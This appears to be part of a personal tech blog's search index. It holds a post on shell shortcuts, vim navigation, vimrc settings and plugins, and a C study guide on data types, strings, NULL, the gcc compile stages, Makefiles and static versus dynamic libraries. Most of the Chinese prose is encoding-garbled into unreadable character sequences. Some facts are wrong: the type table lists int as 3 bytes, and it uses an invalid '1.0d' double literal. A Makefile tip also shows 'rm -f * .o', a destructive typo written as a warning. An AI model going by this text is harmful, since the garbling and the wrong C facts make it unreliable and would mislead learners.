ä¸ªæ¯”è¾ƒæ–¹ä¾¿çš„å¿«æ·é”®(zshå¯èƒ½ä¸ä¸€æ ·)sudo !! - re-run previous command with â€˜sudoâ€™ prepended ##æ•²å‘½ä»¤å¿˜è®°åŠ sudoäº†ï¼Œç›´æ¥sudo!!ï¼ŒæŠŠä¸Šä¸€ä¸ªå‘½ä»¤åŠ ä¸Šsudoæ‰§è¡Œä¸€é ctrl-kï¼ˆå‰ªåˆ‡æ‰å…‰æ ‡ä¹‹åçš„æ–‡å­—ï¼‰ctrl-y(æŠŠctrl kå‰ªåˆ‡çš„æ–‡å­—ç²˜è´´ä¸Šæ¥)ctrl-u(æ¸…ç©ºå½“å‰è¡Œ)ctrl-w(remove word by word) use â€˜less +Fâ€™ to view logfiles, instead of â€˜tailâ€™ (ctrl-c, shift-f, q to quit)ctrl-x-e - continue editing your current shell line in a text editor (uses $EDITOR)alt-. - paste previous commandâ€™s argument (useful for running multiple commands on the same resource) åœ¨å½“å‰ç›®å½•ä¸‹æŸ¥æ‰¾â€pythonâ€è¿™å‡ ä¸ªå­—ç¬¦ grep -ni â€œpythonâ€ * //å¦‚æœè¦é€’å½’ï¼Œå°±æ˜¯ç¢°åˆ°å­æ–‡ä»¶å¤¹å°±å¾€ä¸‹æ‰¾ è¿™ä¸ªå‘½ä»¤å¥½åœ¨èƒ½å¤Ÿæ˜¾ç¤ºåœ¨å“ªä¸ªæ–‡ä»¶çš„å“ªä¸€è¡Œæ‰¾åˆ°çš„ æ¥ä¸‹æ¥æ˜¯vimå¸¸ç”¨çš„ä¸€äº› é¦–å…ˆæ˜¯command modeä¸‹çš„ k h l j æŒªåˆ°æ–‡ä»¶å¼€å¤´: H æŒªåˆ°æ–‡ä»¶å¤´éƒ¨æ˜¯ggæŒªåˆ°æ–‡ä»¶æœ€å: L æŒªåˆ°æ–‡ä»¶åº•éƒ¨æ˜¯G åˆ é™¤æœ¬è¡Œå¼€å§‹åˆ°æ–‡ä»¶å¼€å§‹: dggåˆ é™¤æœ¬è¡Œåˆ°æ–‡ä»¶æœ«å°¾dG èµ°åˆ°ç¬¬5è¡Œï¼š 5G å¤åˆ¶å½“å‰è¡Œ: yyå¤åˆ¶2è¡Œï¼š 2yyåˆšæ‰å¤åˆ¶çš„ä¸œè¥¿è¦ç²˜è´´: p(å…‰æ ‡åç²˜è´´)ï¼ŒP(å…‰æ ‡å‰ç²˜è´´)å¤åˆ¶å½“å‰å•è¯: yw å‰ªåˆ‡å½“å‰è¡Œ: ddå‰ªåˆ‡2è¡Œ: 2ddå‰ªåˆ‡å½“å‰å•è¯: dw ä»å…‰æ ‡ä½ç½®åˆ°è¡Œæœ«å°¾å…¨éƒ¨å‰ªåˆ‡ï¼šD(D$ä¹Ÿè¡Œ) æ’¤é”€åˆšæ‰çš„æ“ä½œ(undo): u èµ°åˆ°å½“å‰è¡Œçš„æœ«å°¾: $ (Aæ˜¯æŠŠå…‰æ ‡æŒªåˆ°è¡Œæœ«å°¾ï¼Œè¿›å…¥ç¼–è¾‘æ¨¡å¼)èµ°åˆ°å½“å‰è¡Œçš„å¼€å¤´: 0 (Iæ˜¯æŠŠå…‰æ ‡æŒªåˆ°è¡Œå¼€å¤´ï¼Œè¿›å…¥ç¼–è¾‘æ¨¡å¼) èµ°åˆ°æ–‡æ¡£å¼€å¤´[[èµ°åˆ°æ–‡æ¡£æœ«å°¾]] åˆ é™¤å…‰æ ‡æ‰€åœ¨çš„å•è¯ï¼š cw(åˆ é™¤å…‰æ ‡å¼€å§‹åˆ°å•è¯ç»“å°¾) ciw(åˆ é™¤å½“å‰å•è¯ï¼Œå¹¶ä¸”è¿›å…¥ç¼–è¾‘æ¨¡å¼) caw(change around wordï¼Œä¸è¿›å…¥ç¼–è¾‘æ¨¡å¼) åœ¨vimä¸­æ‰§è¡Œbashå‘½ä»¤ï¼švim all.txt:read !ls//lsçš„ç»“æœè¢«ç›´æ¥å†™å…¥å½“å‰æ–‡ä»¶ visual modeè¿›å…¥visual modeä¹‹åå°±å¯ä»¥å¤§æ®µçš„å¤åˆ¶ç²˜è´´äº† è¿˜å¯ä»¥å…¨æ–‡æœç´¢æŒ‰ä¸€ä¸ª/ï¼ˆæ–œæ å°±å¯ä»¥äº†ï¼‰ï¼ŒæŒ‰næ—¶æ˜¯ä¸‹æŸ¥æ‰¾ä¸‹ä¸€ä¸ªåŒ¹é…ç»“æœ å…¨å±€æ›¿æ¢:%s/è¦è¢«æ›¿æ¢çš„æ–‡å­—/æ–°çš„æ–‡å­—/g ï¼Œgæ˜¯å…¨å±€çš„æ„æ€ï¼Œçœ‹æ¸…æ¥šå‰é¢æœ‰ä¸€ä¸ªç™¾åˆ†å· VIMæ ¼å¼åŒ–ä»£ç ï¼šæ ¼å¼åŒ–å…¨æ–‡æŒ‡ä»¤ gg=G //è¿™å…¶å®æ˜¯ä¸‰ä¸ªå‘½ä»¤,ggæ˜¯åˆ°è¾¾æ–‡æ¡£å¼€å§‹,=æ˜¯è¦æ±‚ç¼©è¿›ï¼ŒGæ˜¯åˆ°è¾¾æ–‡æ¡£æœ€åä¸€è¡Œè‡ªåŠ¨ç¼©è¿›å½“å‰è¡ŒæŒ‡ä»¤ ==æ ¼å¼åŒ–å½“å‰å…‰æ ‡æ¥ä¸‹æ¥çš„8è¡Œ 8=æ ¼å¼åŒ–é€‰å®šçš„è¡Œ v é€‰ä¸­éœ€è¦æ ¼å¼åŒ–çš„ä»£ç æ®µ = å¾ˆå¤šäººéƒ½ä¼šæœ‰ä¸€ä¸ªvimrcæ–‡ä»¶å¤‡ä»½åœ¨githubä¸Šï¼Œé‚£ä¹ˆvimrcå…¶å®å°±æ˜¯å¯¹äºvimè¿™ä¸ªç¼–è¾‘å™¨çš„é…ç½®æ–‡ä»¶å…¨å±€çš„vimrcæ–‡ä»¶åœ¨/etc/vim/vimrc è¿™ä¸ªä½ç½®ï¼Œé’ˆå¯¹å•ä¸ªç”¨æˆ·è¿˜æ˜¯åœ¨~/.vimrcè¿™ä¸ªæ–‡ä»¶é‡Œé¢æ”¹ set number &quot;æ˜¾ç¤ºè¡Œå·ï¼Œè¿™ä¸ªæ³¨é‡Šåªè¦å·¦è¾¹çš„å†’å·å°±è¡Œäº† syntax on â€œè‡ªåŠ¨è¯­æ³•é«˜äº® set shiftwidth=4 â€œé»˜è®¤ç¼©è¿›4ä¸ªç©ºæ ¼ set softtabstop=4 â€œä½¿ç”¨tabæ—¶ tabç©ºæ ¼æ•° set tabstop=4 â€œtab ä»£è¡¨4ä¸ªç©ºæ ¼ set expandtab â€œä½¿ç”¨ç©ºæ ¼æ›¿æ¢tab æ¯”è¾ƒå‡ºåçš„vimrcæ˜¯the ultimate vimrcï¼Œè‡ªå¸¦ä¸€äº›æ¯”è¾ƒå¥½çš„æ’ä»¶é¦–å…ˆåœ¨ä»»æ„ç›®å½•,è¾“å…¥vimã€‚ä»»ä½•æ—¶å€™æƒ³è¦é€€å‡ºvimçš„è¯ :q å°±å¯ä»¥äº† ä¸€äº›å¥½ç”¨çš„æ’ä»¶ï¼šNERDTreeæ˜¯ä¸€ä¸ªç±»ä¼¼äºfile browserçš„æ’ä»¶ctrl + w + h å…‰æ ‡ focus å·¦ä¾§æ ‘å½¢ç›®å½•ctrl + w + l å…‰æ ‡ focus å³ä¾§æ–‡ä»¶æ˜¾ç¤ºçª—å£ctrl + w + w å…‰æ ‡è‡ªåŠ¨åœ¨å·¦å³ä¾§çª—å£åˆ‡æ¢ctrl + w + r ç§»åŠ¨å½“å‰çª—å£çš„å¸ƒå±€ä½ç½®o åœ¨å·²æœ‰çª—å£ä¸­æ‰“å¼€æ–‡ä»¶ã€ç›®å½•æˆ–ä¹¦ç­¾ï¼Œå¹¶è·³åˆ°è¯¥çª—å£go åœ¨å·²æœ‰çª—å£ ä¸­æ‰“å¼€æ–‡ä»¶ã€ç›®å½•æˆ–ä¹¦ç­¾ï¼Œä½†ä¸è·³åˆ°è¯¥çª—å£t åœ¨æ–° Tab ä¸­æ‰“å¼€é€‰ä¸­æ–‡ä»¶/ä¹¦ç­¾ï¼Œå¹¶è·³åˆ°æ–° TabT åœ¨æ–° Tab ä¸­æ‰“å¼€é€‰ä¸­æ–‡ä»¶/ä¹¦ç­¾ï¼Œä½†ä¸è·³åˆ°æ–° Tabi split ä¸€ä¸ªæ–°çª—å£æ‰“å¼€é€‰ä¸­æ–‡ä»¶ï¼Œå¹¶è·³åˆ°è¯¥çª—å£gi split ä¸€ä¸ªæ–°çª—å£æ‰“å¼€é€‰ä¸­æ–‡ä»¶ï¼Œä½†ä¸è·³åˆ°è¯¥çª—å£s vsplit ä¸€ä¸ªæ–°çª—å£æ‰“å¼€é€‰ä¸­æ–‡ä»¶ï¼Œå¹¶è·³åˆ°è¯¥çª—å£gs vsplit ä¸€ä¸ªæ–° çª—å£æ‰“å¼€é€‰ä¸­æ–‡ä»¶ï¼Œä½†ä¸è·³åˆ°è¯¥çª—å£:tabnew [++opté€‰é¡¹] ï¼»ï¼‹cmdï¼½ æ–‡ä»¶ å»ºç«‹å¯¹æŒ‡å®šæ–‡ä»¶æ–°çš„tab:tabc å…³é—­å½“å‰çš„ tab:tabo å…³é—­æ‰€æœ‰å…¶ä»–çš„ tab:tabs æŸ¥çœ‹æ‰€æœ‰æ‰“å¼€çš„ tab:tabp å‰ä¸€ä¸ª tab:tabn åä¸€ä¸ª tab vim-fugitive fugitive.vim: A Git wrapper so awesome, it should be illegal ctrl +f å°±æ˜¯æ¿€æ´»ctrlpè¿™ä¸ªæ’ä»¶ï¼Œç±»ä¼¼äºæ–‡ä»¶æœç´¢ å†…ç½®äº†vim-markdownã€‚é»˜è®¤å·²ç»å¯ä»¥å®ç°markdownè¯­æ³•é«˜äº®ã€‚é»˜è®¤æ˜¯è‡ªåŠ¨æŠŠæ®µè½æ”¶èµ·æ¥çš„ï¼Œå…‰æ ‡ä¸€ç›´æŒªåˆ°å³è¾¹å°±è‡ªåŠ¨å±•å¼€äº† è‡ªåŠ¨è¡¥å…¨ï¼Œåœ¨ç¼–è¾‘æ¨¡å¼(i) ï¼ŒCtrl+ p å‚è€ƒvim cheat sheetyoutubeä¸Šä¸€ä¸ªæ¯”è¾ƒå¥½çš„å…³äºvimçš„è§†é¢‘ç»ƒä¸Šä¸€å¹´å†æ¥æ€»ç»“çš„vimä½¿ç”¨æŠ€å·§","tags":[{"name":"linux","slug":"linux","permalink":"https://haldir65.github.io/tags/linux/"}]},{"title":"Cè¯­è¨€å­¦ä¹ æ‰‹å†Œ","date":"2018-07-29T17:47:28.000Z","path":"2018/07/29/2018-07-29-Learn-to-program-with-c/","text":"Cè¯­è¨€å®ç”¨æŒ‡å—ï¼Œæš‚æ—¶ä¸æ¶‰åŠcppå†…å®¹ 1.åŸºæœ¬æ•°æ®ç±»å‹Cçš„åŸºæœ¬æ•°æ®ç±»å‹è¿˜æ˜¯å¾ˆå¤šçš„ å±…ç„¶è¿˜æœ‰unsigned long long int è¿™ç§åˆ«æ‰­çš„ä¸œè¥¿ã€‚size_t å’Œintå·®ä¸å¤šï¼Œä¼°æ‘¸ç€æ˜¯è·¨å¹³å°çš„ä¸€ç§è¡¨ç¤ºã€‚ æè¿° æ•°æ®ç±»å‹ sizeof(64ä½linuxä¸‹) å­—ç¬¦ char 1 çŸ­æ•´æ•° short 2 æ•´æ•° int 3 é•¿æ•´æ•° long 8 å•ç²¾åº¦æµ®ç‚¹æ•° float 4 åŒç²¾åº¦æµ®ç‚¹æ•° double 8 æ— ç±»å‹ void 1 scanfæ–¹æ³•å­˜åœ¨å†…å­˜æº¢å‡ºçš„å¯èƒ½æ€§ï¼Œå¾®è½¯æå‡ºäº†scanf_så‡½æ•°ï¼Œéœ€è¦æä¾›æœ€å¤šå…è®¸è¯»å–çš„é•¿åº¦ï¼Œè¶…å‡ºè¯¥é•¿åº¦çš„å­—ç¬¦ä¸€å¾‹å¿½ç•¥æ‰ã€‚æ±‡ç¼–è¯­è¨€ NULL å€¼NULLåœ¨stdio.hå®é™…ä¸Šæ˜¯#define NULL ((void *) 0)ï¼Œè€Œåœ¨ C++ ä¸­åˆ™ç›´æ¥è¢«å®šä¹‰ä¸ºäº† 0ï¼Œ#define NULL 0ã€‚ float a = 1.0f; double b = 1.0d; long double ld = 1.0l; //é•¿æµ®ç‚¹æ•° // å¦‚æœä¸æŒ‡å®šåç¼€fï¼Œåˆ™é»˜è®¤ä¸ºdoubleå‹ æ— ç¬¦å·æ•° char short int longé»˜è®¤éƒ½æ˜¯æœ‰ç¬¦å·çš„ï¼Œé¦–ä½ç”¨æ¥å­˜å‚¨ç¬¦å·ä½ã€‚å¦‚æœä¸éœ€è¦ä½¿ç”¨è´Ÿæ•°ï¼Œåˆ™å¯ä»¥ä½¿ç”¨æ— ç¬¦å·æ•°ï¼Œåªè¦åœ¨å‰é¢åŠ ä¸Šunsignedå³å¯ã€‚å¦‚unsigned char unsigned shortã€unsigned intã€unsigned longï¼Œå…¶ä¸­unsigned intå¯ä»¥ç®€å†™ä¸ºunsignedã€‚ bool(boolean)ä¸æ˜¯ä¸€ç§åŸºæœ¬æ•°æ®ç±»å‹ï¼Œåœ¨c99åŠä»¥åå¯ä»¥ç”¨æ˜¯å› ä¸ºâ€itâ€™s still not a keyword. Itâ€™s a macro declared in &lt;stdbool.h&gt;.â€ #include&lt;stdio.h&gt; #include&lt;stdbool.h&gt; void main(){ bool x = true; if(x) printf(&quot;Boolean works in &#39;C&#39;. \\n&quot;); else printf(&quot;Boolean doesn&#39;t work in &#39;C&#39;. \\n&quot;); } string in cchar *name = â€œBobâ€; //nameæŒ‡å‘çš„ä½ç½®ä¸èƒ½ä¿®æ”¹äº†ï¼Œä½†æ˜¯nameå¯ä»¥æŒ‡å‘åˆ«çš„ä¸œè¥¿.// the value is stored in a read-only section in the binary file and cannot be modifiedname[1] = â€˜eâ€™; //è¿™ä¹ˆå¹²æ˜¯ä¸è¡Œçš„ï¼Œç¼–è¯‘æ˜¯èƒ½é€šè¿‡ï¼Œä½†è¿è¡ŒæœŸä¼šé€ æˆundefined behaviorï¼Œå¤§æ¦‚ç‡æ˜¯segment fault You can also define a string as a pointer to a char, initialised by a string literal. In this case, string literals are stored in a read only section of memory and are effectively constant. For example: char *name = &quot;Bob&quot; In this case, the value is stored in a read-only section in the binary file and cannot be modified. If you compile to an assembly file (use the -S compiler option in gcc), you can see the string literals in the .rodata section. In this context, rodata means â€œread-only dataâ€. /* main.s */ .file &quot;main.c&quot; .section .rodata .LC0: .string &quot;Bob&quot; // ä¸‹é¢è¿™ç§ç”¨æ•°ç»„å½¢å¼å£°æ˜çš„æ˜¯å¯ä»¥éšä¾¿æ”¹çš„char name[] = â€œAliceâ€; //å­˜åœ¨stackä¸Šï¼Œéšä¾¿æ”¹name[3] = â€˜nâ€™;name[4] = â€˜aâ€™; åœ¨Cä¸­ï¼ŒNULLè¡¨ç¤ºçš„æ˜¯æŒ‡å‘0çš„æŒ‡é’ˆ #define NULL 0 string.h æ ‡å‡†åº“ä¸­å®šä¹‰äº†ç©ºæŒ‡é’ˆï¼ŒNULL(æ•°å€¼0)åœ¨C/C++ä¸­ï¼Œå½“è¦ç»™ä¸€ä¸ªå­—ç¬¦ä¸²æ·»åŠ ç»“æŸæ ‡å¿—æ—¶ï¼Œéƒ½åº”è¯¥ç”¨â€˜\\0â€™è€Œä¸æ˜¯NULLæˆ–0 â€˜\\0â€™æ˜¯ä¸€ä¸ªâ€œç©ºå­—ç¬¦â€å¸¸é‡ï¼Œå®ƒè¡¨ç¤ºä¸€ä¸ªå­—ç¬¦ä¸²çš„ç»“æŸï¼Œå®ƒçš„ASCIIç å€¼ä¸º0ã€‚æ³¨æ„å®ƒä¸ç©ºæ ¼â€™ â€˜ï¼ˆASCIIç å€¼ä¸º32ï¼‰åŠâ€™0â€™ï¼ˆASCIIç å€¼ä¸º48ï¼‰ä¸ä¸€æ ·çš„ã€‚ printf(&quot;%s\\n&quot;, &#39;\\0&#39;== NULL ? &quot;true&quot; : &quot;false&quot;); // è¾“å‡ºæ˜¯true æ‰€ä»¥â€™\\0â€™ å°±æ˜¯ NULL ? ç¼–è¯‘è¿‡ç¨‹ä¸­æœ‰æ—¶å€™å¯èƒ½ä¼šå‡ºç°ä¸€äº›è­¦å‘Šâ€œImplicit declaration of function â€˜sleepâ€™ is invalid in C99â€æ¯”å¦‚è¿™é‡Œä½¿ç”¨äº†sleepå‡½æ•°,å´å¿˜è®°äº†includeå¯¹åº”çš„å‡½æ•°ï¼Œå°±ä¼šæŠ¥è­¦å‘Š sleep is a non-standard function. On UNIX, you shall include &lt;unistd.h&gt;. On MS-Windows, Sleep is rather from &lt;windows.h&gt;. Cå¹¶ä¸æ£€æŸ¥æ•°ç»„è¶Šç•Œ, æ•°ç»„è¶Šç•Œå±äºundefined behaviorã€‚ C doesn&#39;t check array boundaries. A segmentation fault will only occur if you try to dereference a pointer to memory that your program doesn&#39;t have permission to access. Simply going past the end of an array is unlikely to cause that behaviour. Undefined behaviour is just that - undefined. It may appear to work just fine, but you shouldn&#39;t be relying on its safety. 2. ç¼–è¯‘è¿‡ç¨‹çš„ä¸€äº›è§£é‡ŠCè¯­è¨€ç¨‹åºç¼–è¯‘çš„é¡ºåºæ˜¯source code -&gt; preprocessing -&gt; compilating -&gt; assembling -&gt; linking -&gt; executable file 1. é¢„å¤„ç† cat hello_world.c #include &lt;stdio.h&gt; #define EXAMPLE &quot;example\\n&quot; int main(void) { printf(&quot;hello world!\\n&quot;); printf(EXAMPLE); return 0; } gcc -E hello_world.c | tail -10éœ€è¦tailä¸€ä¸‹ï¼Œå› ä¸ºé¢„å¤„ç†é˜¶æ®µä¼šæŠŠstdio.hä¸­æ‰€æœ‰ä»£ç å¤åˆ¶ç²˜è´´è¿›æ¥ # 499 &quot;/usr/include/stdio.h&quot; 2 3 4 # 2 &quot;hello_world.c&quot; 2 int main(void) { printf(&quot;hello world!\\n&quot;); printf(&quot;example\\n&quot;); return 0; } âœ 2.compilingåœ¨è¿™ä¸€è¿‡ç¨‹ä¸­ï¼Œç¼–è¯‘å™¨å°†cè¿™æ ·çš„high level languageè½¬æˆassembly code.(ç›´æ¥è½¬æˆmachine codeä¸å¤ªç°å®)ï¼ŒåŒä¸€ä»½ä»£ç åœ¨ä¸åŒçš„æœºå™¨ä¸Šæœ€ç»ˆå˜æˆçš„machine codeå¯èƒ½ç›¸å·®å¾ˆå¤§Assembly codeæ˜¯human readableçš„æˆ‘ä»¬å¯ä»¥ç”¨-Sè®©ç¼–è¯‘å™¨èµ°åˆ°æ±‡ç¼–è¿™ä¸€æ­¥å°±æ‰“ä½ gcc -S hello_world.c cat hello_world.s | head -15 æ±‡ç¼–çœ‹èµ·æ¥æ˜¯è¿™æ ·çš„ .section __TEXT,__text,regular,pure_instructions .macosx_version_min 10, 12 .globl _main .p2align 4, 0x90 _main: ## @main .cfi_startproc ## BB#0: pushq %rbp Lcfi0: .cfi_def_cfa_offset 16 Lcfi1: .cfi_offset %rbp, -16 movq %rsp, %rbp Lcfi2: .cfi_def_cfa_register %rbp 3. æ¥ä¸‹æ¥æ˜¯assemblingè¿™ä¸€æ­¥,ç¼–è¯‘å™¨æŠŠæ±‡ç¼–æ–‡ä»¶è½¬æˆmachine code,ä¹Ÿå°±æ˜¯cpuå¯ä»¥ç›´æ¥æ‰§è¡Œçš„ä»£ç ã€‚å¯ä»¥ä½¿ç”¨-c è®©ç¼–è¯‘å™¨åœ¨è¿™é‡Œæ‰“ä½ gcc -c hello_world.c lshello_world.c hello_world.o cat hello_world.o | head -15 ##å°è¯•ç”¨catå»çœ‹äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå…¶å®å¹¶æ²¡æœ‰ç”¨`ï¿½ï¿½ï¿½ï¿½ ï¿½ï¿½ ï¿½textTEXT; ï¿½ï¿½cstringTEXT;[compact_unwindLDX xï¿½eh_frameTEXTx@ï¿½ h$ PUHï¿½ï¿½Hï¿½ï¿½Hï¿½=,ï¿½Eï¿½ï¿½ï¿½Hï¿½=%ï¿½Eï¿½ï¿½1É‰Eï¿½ï¿½Hï¿½ï¿½]ï¿½hello world!example;zRx*- -$hï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½;Aï¿½C _main_printf% è¿™ä»€ä¹ˆé¬¼ğŸ‘» - od -c hello_world.o | head -5 0000000 317 372 355 376 \\a \\0 \\0 001 003 \\0 \\0 \\0 001 \\0 \\0 \\0 0000020 004 \\0 \\0 \\0 \\0 002 \\0 \\0 \\0 \\0 \\0 \\0 \\0 \\0 \\0 0000040 031 \\0 \\0 \\0 210 001 \\0 \\0 \\0 \\0 \\0 \\0 \\0 \\0 \\0 \\0 0000060 \\0 \\0 \\0 \\0 \\0 \\0 \\0 \\0 \\0 \\0 \\0 \\0 \\0 \\0 \\0 \\0 0000100 270 \\0 \\0 \\0 \\0 \\0 \\0 \\0 002 \\0 \\0 \\0 \\0 \\0 \\0 è¿™æ‰åƒæ ·å˜› ### 4. linking é“¾æ¥æ˜¯ç¼–è¯‘çš„æœ€åä¸€æ­¥ï¼Œè¿™ä¸€æ­¥ç¼–è¯‘å™¨å°†æ‰€æœ‰çš„æœºå™¨ç æ–‡ä»¶(ä¹Ÿå°±æ˜¯.oæ–‡ä»¶)åˆæˆå¯æ‰§è¡Œæ–‡ä»¶ã€‚ä¸éœ€è¦ä¼ ä»€ä¹ˆflag,ç›´æ¥gcc hello_world.cå°±å¯ä»¥äº† é»˜è®¤ç”Ÿæˆçš„æ–‡ä»¶åå«åša.out,å¯ä»¥ä½¿ç”¨-oå‚æ•°æŒ‡å®šç”Ÿæˆçš„æ–‡ä»¶åã€‚ç„¶å./a.outå°±å¯ä»¥æ‰§è¡Œäº† .soæ–‡ä»¶å…¶å®æ˜¯shared objectçš„ç¼©å†™ [compiler frontendå’Œ backendçš„æ¦‚å¿µ](https://stackoverflow.com/a/9765464) The front-end deals with the language itself: scanning, parsing, the parse-tree. The back end deals with the target system: object code formats, the machine code itself, â€¦ The two things donâ€™t have all that much to do with each other, and for a portable compiler it is highly desirable to use the same front-end with multiple backends, one per target. You can take that further, as gcc does, and have a front/backend interface that is language-independent, so you can use different language front-ends with the same backend. In the old days this was called the MxN problem: you donâ€™t want to have to write MxN compilers where you have M languages and N target systems. The idea is to only have to write M+N compilers. ä»¥åŠ[åœ¨windowsä¸Šå®‰è£…rustä¸ºä»€ä¹ˆéœ€è¦å…ˆè£…msvc](https://users.rust-lang.org/t/why-do-i-need-microsoft-c-build-tools/18581/5) ## 4. Makefileæ€ä¹ˆå†™ [å‡ ä¸ªç®€å•çš„makefileå®ä¾‹](http://www.cs.colby.edu/maxwell/courses/tutorials/maketutor/) // æ¯”æ–¹è¯´å†™äº†ä¸‰ä¸ªæ–‡ä»¶,main.c,test.c,test.hã€‚è¿™æ˜¯æœ€ç®€å•çš„ä¾‹å­ main: main.c gcc -o main main.c test.c //ok,æ²¡é—®é¢˜äº† gcc -std=c11 -o outputfile sourcefile.c //æŒ‡å®šä½¿ç”¨c11(ä¼¼ä¹ç›®å‰c99æœ‰ç‚¹è€äº†)ï¼ŒMakefileé‡Œé¢åŠ ä¸ŠCFLAGS = -Wall -std=c99å°±å¯ä»¥äº† [C Programming: Makefiles](https://www.youtube.com/watch?v=GExnnTaBELk) make clean clean: rm -f *.o program_name å› ä¸ºæ‰‹åŠ¨rmå¯èƒ½å†™æˆ rm -f * .o ##ä¸­é—´å¤šä¸€ä¸ªç©ºæ ¼ gcc -gå‚æ•°ï¼Œå¯ä»¥é€šè¿‡objdumpæ¥åˆ†ææ±‡ç¼–æºç (windowsä¸Šä¹Ÿå¯ä»¥) ## 5. é™æ€åº“å’ŒåŠ¨æ€åº“çš„åŒºåˆ«åŠä½¿ç”¨ [static and dynamic libraries](https://www.geeksforgeeks.org/static-vs-dynamic-libraries/) **Shared Library File Extensions:** Windows: .dll Mac OS X: .dylib Linux: .so **Static Library File Extensions:** Windows: .lib Mac OS X: .a Linux: .a static libraryæŠŠä¾èµ–çš„libraryéƒ½æ‰“åŒ…è¿›å»äº†ï¼Œä½“ç§¯æ›´å¤§ dynamic libvraryåªæ˜¯å†™äº†ä¾èµ–çš„libraryçš„åç§°ï¼Œè¿è¡Œæ—¶éœ€è¦å»æ“ä½œç³»ç»Ÿä¸­å»æ‰¾ï¼Œä¼šæ…¢ä¸€äº› ### static library(compile timeå·²å®Œæˆlinkï¼Œè€Œdynamic libraryéœ€è¦åœ¨runtimeå®Œæˆlink) æŸ¥çœ‹archiveæ–‡ä»¶ä¸­çš„å†…å®¹ ar -tv libmylib.a nm somebinaryfile ## æŸ¥çœ‹åŠ¨æ€å’Œé™æ€åº“ä¸­çš„ç¬¦å·è¡¨ ls /usr/lib ## æ–‡ä»¶å¤¹ä¸­åˆå„ç§lib,åŒ…æ‹¬soæ–‡ä»¶å’Œ.aæ–‡ä»¶ ls /usr/include # è¿™é‡Œä¹Ÿæœ‰ä¸€å¤§å †å¤´æ–‡ä»¶ clang wacky.c -L. -lwacky -o wacky ## -L. è¡¨ç¤ºåœ¨å½“å‰ç›®å½•ä¸‹æŸ¥æ‰¾åé¢çš„libwacky.soæˆ–è€…libwacky.aæ–‡ä»¶ã€‚æ‰€ä»¥å®Œå…¨å¯ä»¥link ç³»ç»Ÿä¸­å­˜åœ¨çš„(/usr/libç›®å½•ä¸­)çš„libraryå¹¶compileåˆ°programä¸­ Makefile for bundling static libraryï¼ˆæ¯ä¸€ä¸ªchunkå«åšrecepieï¼‰ ä¸èƒ½ç”¨ç©ºæ ¼ï¼Œéœ€è¦ç”¨Tab default: wacky wacky: libwacky.a wacky.c clang wacky.c -L. -lwacky -o wacky libwacky.a: wacky_math.o ar -rcv $@ $^ ### dynamic library wacky_math.o: wacky_math.c wacky_math.h clang -c -fPIC wacky_math.c -o $@ -fPICä½¿å¾—ç”Ÿæˆçš„object fileæ˜¯relocateableçš„ åŒæ—¶è¿˜å¾—å‘Šè¯‰run time linkerå¦‚ä½•å»æ‰¾è¿™ä¸ªsoæ–‡ä»¶ man ldpath ## soæ–‡ä»¶æŸ¥æ‰¾ç›®å½• export LD_LIBRARY_PATH=. ## æ·»åŠ å½“å‰ç›®å½•ä¸ºæŸ¥æ‰¾è·¯å¾„ //ä¸€èˆ¬soæ–‡ä»¶éƒ½åœ¨/usr/libæˆ–è€…/usr/local/libæ–‡ä»¶å¤¹ä¸‹é¢ locate sodium.so make wacky ä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œå¯ä»¥æŒ‡å®šç¼–è¯‘target è¿˜æœ‰ä¸€ç§åŠ¨æ€æŸ¥æ‰¾ç¬¬ä¸‰æ–¹åº“çš„æ–¹æ³• [dlopenå’Œsoname](https://renenyffenegger.ch/notes/development/languages/C-C-plus-plus/GCC/create-libraries/index) ## 6. å¦‚ä½•ä½¿ç”¨ç¬¬ä¸‰æ–¹åº“ åœ¨c programä¸­ä½¿ç”¨å…¶ä»–çš„libraryä»¥åŠå¦‚ä½•ç¼–è¯‘ç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶ [ä»¥mysqlçš„cåº“ä¸ºä¾‹](https://blog.csdn.net/yanxiangtianji/article/details/20474155) å¦‚æœåº“åœ¨ usr/include/ ç›®å½•ä¸‹ï¼Œé‚£ä¹ˆå°±ç”¨ #include &lt; *.h &gt;ã€‚è¿™ä¸ªç›®å½•ä¸‹é¢æ”¾çš„éƒ½æ˜¯äº›å¤´æ–‡ä»¶ å¦‚æœåº“åœ¨å½“å‰ç›®å½•ä¸‹ï¼Œå°±ç”¨ #include &quot;mylib.h&quot; gcc -vå¯ä»¥æŸ¥çœ‹compile gccæ—¶é¢„è®¾çš„é“¾æ¥é™æ€åº“çš„æœç´¢è·¯å¾„ gcc -print-search-dirs ##ç¼–è¯‘å™¨é»˜è®¤ä¼šæ‰¾çš„ç›®å½•å¯ä»¥ç”¨-print-search-dirsé€‰é¡¹æŸ¥çœ‹ é»˜è®¤æƒ…å†µä¸‹ï¼Œ GCCåœ¨é“¾æ¥æ—¶ä¼˜å…ˆä½¿ç”¨åŠ¨æ€é“¾æ¥åº“ï¼Œåªæœ‰å½“åŠ¨æ€é“¾æ¥åº“ä¸å­˜åœ¨æ—¶æ‰è€ƒè™‘ä½¿ç”¨é™æ€é“¾æ¥åº“ï¼Œå¦‚æœéœ€è¦çš„è¯å¯ä»¥åœ¨ç¼–è¯‘æ—¶åŠ ä¸Š-staticé€‰é¡¹ï¼Œå¼ºåˆ¶ä½¿ç”¨é™æ€é“¾æ¥åº“ã€‚ ä»é¡¹ç›®ç»“æ„æ¥çœ‹,curl,ffmpegè¿™äº›éƒ½æ˜¯ä¸€ä¸ªæ–‡ä»¶å¤¹é‡Œé¢æ”¾äº†æ‰€æœ‰çš„.hå’Œ.cæ–‡ä»¶ã€‚ä¼¼ä¹æ²¡æœ‰å…¶ä»–è¯­è¨€çš„packageçš„è§‚å¿µã€‚æˆ‘è¯•äº†ä¸‹ï¼Œåœ¨Makefileé‡Œé¢å¸¦ä¸Šæ–‡ä»¶å¤¹çš„ç›¸å¯¹è·¯å¾„è¿˜æ˜¯å¯ä»¥çš„ã€‚ ## 7. visual studioç­‰å·¥å…·ä½¿ç”¨ [windowså¹³å°ä½¿ç”¨visual studioåˆ›å»ºCé¡¹ç›®](https://www.youtube.com/watch?v=Slgwyta-JkA) File -&gt; new Project -&gt;Windows DeskTop Wizard -&gt; é€‰ä¸­Empty Project -&gt; å–æ¶ˆé€‰ä¸­Precompile Header ç„¶åå³ä¾§ï¼Œsource File,å³é”®ï¼Œnew 